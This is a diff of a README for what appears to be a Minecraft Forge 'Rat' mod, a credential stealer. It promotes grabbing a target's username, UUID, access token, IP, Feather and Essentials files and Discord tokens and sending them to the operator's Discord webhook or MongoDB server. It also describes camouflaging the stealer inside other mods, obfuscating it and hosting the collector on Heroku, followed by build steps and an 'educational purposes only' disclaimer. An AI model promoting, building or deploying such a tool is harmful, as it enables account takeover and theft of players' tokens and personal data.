@@ -6,7 +6,7 @@
 
 **Retrieve Access Token**
 
-![](https://img.shields.io/badge/MC--VERSION-FORGE_1.12.2-0?style=for-the-badge)
+![](https://img.shields.io/badge/MC--VERSION-FORGE_1.18-0?style=for-the-badge)
 ![](https://img.shields.io/badge/Express.js-000000?style=for-the-badge&logo=express&logoColor=white)
 ![](https://img.shields.io/badge/MongoDB-4EA94B?style=for-the-badge&logo=mongodb&logoColor=white)
 ![](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)
@@ -16,8 +16,7 @@
 > Check out [DxxxxY/TokenAuth](https://github.com/DxxxxY/TokenAuth), a session id login mod.
 
 ## Features
-> 1.12.2 bundles another version of JNA which refuses to decrypt the tokens which I cannot shade myself and relocate because the JVM does not trust other JNA paths.
-- Grabs the **username, uuid, token, ip, feather file, essentials file and ~~discord tokens~~** of a target as a *JSON*.
+- Grabs the **username, uuid, token, ip, feather file, essentials file and discord tokens** of a target as a *JSON*.
 - Apparently switching the feather or essential files with yours grants you infinite access to their account thanks to the **refreshToken**. (Unconfirmed, ask Annah#5795)
 - Additionally, it stores a **formatted session string** ready to use with [DxxxxY/TokenAuth](https://github.com/DxxxxY/TokenAuth).
 - JavaScript backend server which:
@@ -30,7 +29,6 @@
 - Makes nuking/trolling impossible, due to webhook/database urls being private.
 - Can be easily be hosted on *Heroku*. (Tutorial available [here](https://www.youtube.com/watch?v=JWoBSp8XU_8&t=4s&ab_channel=DxxxxY))
 - Can be easily configured to either use `Discord Webhooks` or `MongoDB` or both.
-- Bypasses PizzaClient's SessionProtection.
 - Can be easily hidden/camouflaged in other mods (1 single class). (Tutorial available [here](https://www.youtube.com/watch?v=XedVI2JHCjA&t=152s&ab_channel=DxxxxY))
 
 - Uses:
@@ -50,11 +48,14 @@
   2. Install dependencies.
   3. Run the server.
 
+> Major difference from 1.8.9 and 1.12.2 !!!
 - Mod
-  1. Follow [1.12.2ForgeTemplate#setup](https://github.com/DxxxxY/1.12.2ForgeTemplate#setup) to setup your mod environment.
-  2. Change url to your server and change some other stuff to make it ✨unique✨.
-  3. Build the mod.
-  4. (Optional) Obfuscate the mod.
+  1. Import `build.gradle` as a project to setup your mod environment.
+  2. Change url to your server.
+  3. If you want to change the default modid of "something", then replace all mentions of the default modid in `resoures/META-INF/mods.toml` to your modid defined in the @Mod annotation in `src/studio/dreamys/Rat`.
+  4. Change some other stuff to make it ✨unique✨.
+  5. Build the mod.
+  6. (Optional) Obfuscate the mod.
 
 ## Disclaimer
 This is for educational purposes only. I am not responsible for any damage caused by this tool.
